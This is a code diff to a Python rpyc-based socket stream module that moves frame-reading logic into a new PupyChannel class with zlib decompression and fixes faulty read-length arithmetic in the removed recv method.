@@ -6,13 +6,15 @@
 __all__=["PupySocketStream", "PupyUDPSocketStream"]
 
 import sys
-from rpyc.core import SocketStream, Connection
+from rpyc.core import SocketStream, Connection, Channel
 from ..buffer import Buffer
 import socket
 import time
 import errno
 import logging
 import traceback
+import zlib
+
 from rpyc.lib.compat import select, select_error, BYTES_LITERAL, get_exc_errno, maxint
 import threading
 
@@ -22,6 +24,44 @@ class addGetPeer(object):
         self.peer=peer
     def getPeer(self):
         return self.peer
+
+class PupyChannel(Channel):
+    def __init__(self, *args, **kwargs):
+        super(PupyChannel, self).__init__(*args, **kwargs)
+        self.compress = True
+        self.COMPRESSION_LEVEL = 5
+
+    def recv(self):
+        """ Recv logic with interruptions """
+
+        packet = self.stream.read(self.FRAME_HEADER.size)
+        # If no packet - then just return
+        if not packet:
+            return None
+
+        header = packet
+
+        while len(header) != self.FRAME_HEADER.size:
+            packet = self.stream.read(self.FRAME_HEADER.size - len(header))
+            if packet:
+                header += packet
+
+        length, compressed = self.FRAME_HEADER.unpack(header)
+
+        data = b''
+        required_length = length + len(self.FLUSHER)
+        while len(data) != required_length:
+            packet = self.stream.read(required_length - len(data))
+            if packet:
+                data += packet
+
+        data = data[:-len(self.FLUSHER)]
+
+        if compressed:
+            data = zlib.decompress(data)
+
+        return data
+
 
 class PupySocketStream(SocketStream):
     def __init__(self, sock, transport_class, transport_kwargs):
@@ -72,36 +112,6 @@ class PupySocketStream(SocketStream):
             raise EOFError("connection closed by peer")
 
         self.buf_in.write(BYTES_LITERAL(buf))
-
-    def recv(self):
-        """ Recv logic with interruptions """
-
-        packet = self.stream.read(self.FRAME_HEADER.size)
-        # If no packet - then just return
-        if not packet:
-            return None
-
-        header = packet
-
-        while len(header) != self.FRAME_HEADER.size:
-            packet = self.stream.read(len(header) - self.FRAME_HEADER.size)
-            if packet:
-                header += packet
-
-        data = b''
-        required_length = length + len(self.FLUSHER)
-        while len(data) != required_length:
-            packet = self.stream.read(len(data) - required_length)
-            if packet:
-                data += packet
-
-        length, compressed = self.FRAME_HEADER.unpack(header)
-        data = self.stream.read(length + len(self.FLUSHER))[:-len(self.FLUSHER)]
-
-        if compressed:
-            data = zlib.decompress(data)
-
-        return data
 
     # The root of evil
     def poll(self, timeout):
